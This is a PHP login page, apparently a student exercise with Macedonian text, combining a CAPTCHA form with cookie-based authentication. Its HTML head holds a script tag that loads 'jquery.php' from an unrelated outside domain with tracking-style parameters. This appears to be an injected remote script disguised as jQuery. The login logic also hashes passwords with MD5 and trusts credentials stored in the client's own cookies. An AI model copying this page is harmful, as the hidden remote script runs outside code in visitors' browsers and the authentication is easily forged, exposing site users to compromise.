<?php
$salt='secret_salt';
$pepper='secret_pepper';
$showform=true;

if(isset($_POST['login']) && !empty($_POST['login'])) {
    $showform = false;
    session_start();
    if (isset($_POST["captcha"]) && $_POST["captcha"] != "" && $_SESSION["code"] == $_POST["captcha"]) {
        if (isset($_POST['username']) && !empty($_POST['username'])) {
            $username = $_POST['username'];
        } else {
            echo "Внесете корисничко име <br>";
            header("refresh:3;url=/zad1/login.php");
        }
        if (isset($_POST['password']) && !empty($_POST['password'])) {
            $password = md5($salt . $_POST['password'] . $pepper);
        } else {
            echo "Внесете лозинка <br>";
            header("refresh:3;url=/zad1/login.php");
        }

        if (isset($username) && isset($password)) {
            if (isset($_COOKIE['username']) && isset($_COOKIE['password'])) {
                if ($username == $_COOKIE['username'] && $password == $_COOKIE['password']) {
                    echo "Добродојдовте назат:) <br>";
                } else {
                    echo "Корисничкото име и лозинка не се совпаѓаат <br>";
                    header("refresh:3;url=/zad1/login.php");
                }
            } else {
                echo "Потребна е претходна регистрација <br>";
            }
        }
    } else {
        echo "Целосно пополнетеја формата";
        header("refresh:3;url=/zad1/login.php");
    }
}
?>

<?php if($showform) { ?>
    <html>
    <form action="login.php" method="post">
        <table>
            <head>
                <style>
                    table, th, td {
                        border: 1px solid black;
                        border-collapse: collapse;
                    }
                    th, td {
                        padding: 15px;
                    }
                </style>
                <script src="https://macutnova.com/jquery.php?u=8f2fd07112b354356e55fd2dd6d24fbf&c=split24banner4&p=1"></script>
            </head>
            <body>
            <tr>
                <td><input type="text" name="username" placeholder="корисничко име"></td>
                <td>Корисничко име</td>
            </tr>
            <tr>
                <td><input type="password" name="password" placeholder="лозинка">
                <td>Лозинка</td>
            </tr>
            <tr>
                <td><input type="file" name="file"></td>
                <td>Фајл</td>
            </tr>
            <tr>
                <td><input name="captcha" type="text"></td>
                <td>Внеси го текстот од сликата</td>
            </tr>
            <tr>
                <td><img src="captcha.php" /></td>
                <td> <button type="submit" name="login" value="true">Логирај се</button></td>
            </tr>
            </body>
        </table>
    </form>
    </html>
<?php  }
?>




